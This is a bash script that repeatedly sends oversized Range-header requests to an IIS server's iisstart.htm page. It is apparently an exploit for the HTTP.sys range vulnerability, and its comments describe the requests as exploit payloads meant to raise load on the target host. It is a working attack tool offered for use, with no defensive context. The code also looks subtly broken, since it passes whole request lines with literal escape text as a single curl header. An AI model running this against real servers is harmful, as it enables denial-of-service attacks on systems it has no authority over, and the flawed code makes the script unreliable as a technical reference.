#!/bin/bash

# Check if an IP address is provided as an argument
if [ "$#" -lt 1 ]; then
    echo "Usage: $0 <ip_address|URL>"
    exit 1
fi

# Assign the first argument to the host variable
host=$1

# Function to send a payload to the host
send_payload() {
    local payload=$1
    curl -s -o /dev/null -H "$payload" "http://$host/iisstart.htm"
}

# Loop to repeatedly send requests
while true; do
    # Initial request to ensure iisstart.htm exists
    init_payload="GET /iisstart.htm HTTP/1.0\r\n\r\n"
    send_payload "$init_payload"

    # Exploit payload using a large Range header
    exploit_payload="GET /iisstart.htm HTTP/1.1\r\nHost: blah\r\nRange: bytes=18-18446744073709551615\r\n\r\n"
    send_payload "$exploit_payload"

    # Additional payloads to increase load
    for ((i=1; i<=5; i++)); do
        extra_payload="GET /iisstart.htm HTTP/1.1\r\nHost: blah\r\nRange: bytes=$((18*i))-18446744073709551615\r\n\r\n"
        send_payload "$extra_payload"
    done

    echo "Payloads sent to $host, sleeping for 0.5 seconds..."
    sleep 0.5
done
